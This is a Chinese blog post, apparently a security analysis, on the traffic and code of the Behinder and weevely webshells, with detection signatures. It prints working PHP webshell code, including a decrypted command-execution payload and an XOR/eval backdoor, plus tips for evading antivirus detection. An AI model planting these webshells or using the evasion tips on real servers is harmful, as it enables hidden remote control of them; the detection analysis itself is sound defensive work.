> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/Meraki/p/18062036)

> 1. 冰蝎 基于冰蝎的加密流量威胁，剖析其通信原理，冰蝎的通信过程可以分为两个阶段：密钥协商以及加密传输。

基于冰蝎的加密流量威胁，剖析其通信原理，冰蝎的通信过程可以分为两个阶段：密钥协商以及加密传输。  
第一阶段：密钥协商  
攻击者通过 GET 或者 POST 方法，形如`(http://127.0.0.1/shell.aspx?pass=645)`的请求服务器密钥。  
服务器使用随机数 MD5 的高 16 位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。  
第二阶段 - 加密传输  
1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；  
2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；  
3）执行结果通过 AES 加密后返回给攻击者。

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224036691-315322205.png)

通过 wireshark 抓取冰蝎 3.0 流量包：  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224054716-1728198316.png)

冰蝎使用 AES 加密，我们进行 AES 解密试试看：  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224113440-1855676398.png)

还需要对内容进行 base64 解码，就获取了明文：

```
@error_reporting(0);

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function main($cmd,$path)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (! empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    $c = $cmd;
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        $c = $c . " 2>&1\n";
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($c, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (! feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($c);
    } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {
        $fp = popen($c, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (! feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
        $key = $_SESSION['k'];
        echo encrypt(json_encode($result), $key);
        return;
        
    }
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(getSafeStr($kWJW));
    echo encrypt(json_encode($result),  $_SESSION['k']);
}//攻击包

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}$cmd="Y2QgLztscw==";$cmd=base64_decode($cmd);$path="Lw==";$path=base64_decode($path);
main($cmd,$path);


```

1.1 冰蝎流量特征分析
------------

1）流量特征 Accept 字段  
冰蝎的通信过程中会携带以下 Accept 字段，在进行数据通讯中会携带 Accept 字段  
`Accept: application/json, text/javascript, _/_; q=0.01`  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224138144-1534187107.png)

2）流量特征 Content-Type 字段  
PHP 站点：Application/x-www-form-urlencoded  
ASP 站点：Application/octet-stream  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224205782-259266853.png)

3）流量特征 User-agent 字段  
冰蝎设置了 10 种 User-Agent, 每次连接 shell 时会随机选择一个进行使用（具体详情详见文档附录一)。

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224218524-600476868.png)

4）流量特征长连接  
冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection。  
Connection: Keep-Alive  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224225530-1630570946.png)

5) 流量特征固定的请求头和响应头  
PHP 站点默认口令 Default_xor_base64 协议加密流量特征，请求字节头：  
dFAXQV1LORcHRQtLRlwMAhwFTAg/M

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224234008-653338636.png)

响应字节头：  
TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224243185-1634990171.png)

PHP 站点默认口令 Default_aes 协议加密流量特征，请求字节头：  
m7nCS8n4OZG9akdDlxm6OdJevs/jYQ5/IcXK  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224252090-130006223.png)

响应字节头：  
mAUYLzmqn5QPDkyI5lvSp6DmrC24FW39Y4YsJhUqS7

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224302594-1413863038.png)

JSP 站点默认口令 Default_xor_base64 协议，aes_with_magic 协议，Default_aes 协议, 加密流量特征，响应字节头：  
QhoVQgMXEUcUCBMHAGFZaQtuHFUVXlkWGhBcF1QVCRJ

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224314716-242942260.png)

6）流量特征 PHP webshell 中存在固定代码  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224330638-1747025849.png)

JSP webshell 中存在固定代码

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224337521-425507244.png)

7）流量特征连接密码  
默认时，所有冰蝎 4.* webshell 都有 “e45e329feb5d925b” 一串密钥。该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond

1.2 解决建议
--------

基于冰蝎上述的流量特征分析，新版冰蝎在请求数据报文中 Content-type，User-Agent，Accept，Connection 四个请求 Header 字段固定，属于冰蝎的弱特征，由于部分字段非冰蝎特有，可以把这些字段作为一个辅助特征，辅助其他特征来检测校验，判断是否为冰蝎恶意流量。  
在默认密码情况下请求数据报文请求字节头，响应字节头固定，为冰蝎的强特征，可根据字节头内容判断是否为冰蝎恶意流量。  
除了通讯流量特征，冰蝎 webshell 文件也包含固定特征，应检测流量中是否包含冰蝎 webshell 固定代码，以此判断是否为攻击者上传冰蝎 Webshell 文件。

附录一：
----

冰蝎 4.0 内置 10 中 User-Agent 请求头

```
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"


```

Cnife 流量的特征就是 body 部分的参数均为 base64 编码，将该部分进行 base64 解码之后，其流量特征同中国菜刀，还有一个 eval 函数。这里就不展开再说

kali 里面自带的一些 webshell 工具  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224410118-924644363.png)

这里我分析的是 qsd, 第三个文件  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224419709-262606441.png)

可以看到它的 get 请求比较独特，然后返回包带着`<pre><h2>`字段，还有`Content-Type：txt/html` 应该都算是特征值。而且返回包里都是明文。

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224434038-1110758491.png)

可以看出，`ua`可以伪造，`content-type：application/x-www-form-urlencoded`貌似也是弱特征。

根据语法，生成我们要使用的 [webshell](https://so.csdn.net/so/search?q=webshell&spm=1001.2101.3001.7020)，然后将生成的 webshell 文件上传至目标网站服务器

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224445905-178821549.png)

weevely 基础语法如下，其他指令可自行查阅：

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224452604-387206683.png)

weevely 生成的 webshell：

4.1 分析：
-------

从以上代码中摘出来一些比较易懂的参数  
![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224508771-1140268259.png)

从上图可以看出研究的重点是 $D 拼接出的字符串，整理后得到如下代码:

```
$k="9e94b15e";  $kh="d312fa42232f"; $kf="d87ahZ55db0d39"; $p="PY16bXfpTDNaKyiy"; function x($t,$k) {    $c=strlen($k);     $l=strlen($t);    $o="";    for($i=0;$i<$l;)    {        for($j=0;($j<$c&&$i<$l);$j++,$i++)        {            $o.=$t{$i}^$k{$j};        }    }    return $o; } if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){    @ob_start();    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));    $o=@ob_get_contents();    @ob_end_clean();    $r=@base64_encode(@x(@gzcompress($o),$k));    print("$p$kh$r$kf");


```

> 我们把它分为三类：
> 
> 已定义参数
> 
> + 自定义函数
> 
> + 重要部分

4.2 已定义参数：
----------

```
$k="9e94b15e";  $kh="d312fa42232f"; $kf="d87a55db0d39"; $p="PY16bXfpTDNaKyiy";


```

> 生成规律：
> 
> 根据密码生成 $k、$kh 和 $kf 这三个参数的值，不论密码怎么变，$k、$kh 和 $kf 这三个参数名称不变。
> 
> $p 在返回已获取信息时才会用到。

3.2 自定义函数：

```
function x($t,$k) {    $c=strlen($k);     $l=strlen($t);    $o="";    for($i=0;$i<$l;)    {        for($j=0;($j<$c&&$i<$l);$j++,$i++)        {            $o.=$t{$i}^$k{$j};        }    }    return $o; }


```

3.3 重要部分：

```
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){    @ob_start();    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));    $o=@ob_get_contents();    @ob_end_clean();    $r=@base64_encode(@x(@gzcompress($o),$k));    print("$p$kh$r$kf");}


```

关于重要部分的作用及运行流程可参见下图：

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224523050-1324139323.png)

网上对于缓冲区的解释：

> 当执行 PHP 的时候，如果碰到了 echo print_r 之类的会输出数据的代码，PHP 就会将要输出的数据放到 PHP 自身的缓冲区，等待输出。
> 
> 当 PHP 自身的缓冲区接到指令，指示要输出缓冲区的内容时，将会把缓冲区内的数据输出到 apache 上，apache 接受到 PHP 输出的数据，然后再把该数据存在到 apache 自身的缓冲区内，等到输出。

举例：

ob_end_clean() 只会清除缓冲区的内容，并将缓冲区关闭，不会输出内容，如果要在缓冲区关闭前获取缓冲区内容，需要 ob_get_contents()

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224528071-1679565128.png)

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224533705-1846462109.png)

接下来针对流程中的三个关键内容进行分析：

#### 4.2.1 获取加密 [payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)：

用 [Wireshark](https://so.csdn.net/so/search?q=Wireshark&spm=1001.2101.3001.7020) 看 weevely 发出的流量：

我们通过已定义的参数 $kh 和 $kf 的值找到了经过加密的 payload。

#### 4.2.2 解密并运行 payload

代码的具体实现过程：

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224545442-1816490335.png)

为什么在 “解密并运行 payload” 中要用 $m[1]?

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224551525-1908401112.png)

这里详细说明一下自定义函数 x 的运行过程：

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224557276-2124835040.png)

可以从调试过程中看到，$c=8，代表 $k 的长度，$l=27 代表 $m[1] 的长度，这里用 $t 来代表 $m[1]。

当 **$i<$l(27)** 时，外循环进行

> 当 **$j<$c(8)** 且 **$i<$l(27)** 时，内循环进行异或当操作。
> 
> 内循环第一次结束时，**$j=8** 且 **$l=8**，此时外循环不满足结束条件，所以又进行内循环，此时 $j 被重置，所以 **$j=0** 而 **$l=8**。
> 
> 第二次内循环结束时，**$j=8** 且 **$l=16**，同理类推。
> 
> 当内循环不满足 **$j<$c(8)** 且 **$i<$l(27)** 时，跳出内循环

此时外循环 **$i<$l(27)** 不满足，跳出外循环。

#### 4.2.3 加密返回信息

这一步的作用在于防止流量返回时遭到查杀，解密的过程由 weevely 本地完成，即反解下面代码：

> $k="9e94b15e";  
> $kh="d312fa42232f";  
> $kf="d87a55db0d39";  
> $p="PY16bXfpTDNaKyiy";
> 
> $r=@base64_encode(@x(@gzcompress($o),$k));  
> print("$p$kh$r$kf");

如果想自己解密可以遵循以下步骤：

1.  正则匹配去除干扰字符串
2.  base64 解码
3.  反运行自定义函数 x
4.  gzuncompress 解压

4.3 weevely 的 webshell 总结：
--------------------------

作者是如何躲过静态查杀和流量查杀的？

*   使用 str_replace() 进行字符串拼接
*   base64 加密 / 解密
*   自定义函数加密 / 解密
*   使用 gzuncompress() 和 gzcompress()

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224612481-970629167.png)

以上就是 $D 参数中的内容，weevely 通过调用 create_function() 调用以上代码。

4.4 weevely 改进思路：
-----------------

1.  原生 webshell 中，使用了硬编码 (如 hP/hZ) 来混淆敏感字符串（如 create_function），从防御方的角度来看，只需要动态执行一下该 php 的代码，即可获取到对应的明文

> 我们可以在冰蝎 / 蚁剑连接 webshell 时设置特定 http 头，动态传递要被 replace 的字符，以增强其隐蔽性，具体应用在后续的 “**冰蝎和蚁剑改进版**” 中可以看到。

1.  当杀毒软件发现我们解密了一个字符串，并把它当成函数来调用时（如`$G=$X('',$D);$G();`），也会触发查杀行为
    
    > 我们可以使用 $GLOBALS 减弱已解密字符串与函数调用的关系，绕过查杀
    

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224618969-1670303069.png)

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224637034-533708542.png)

![](https://img2024.cnblogs.com/blog/3012782/202403/3012782-20240308224644962-7107054.png)

很明显攻击包在 cookie 字段里面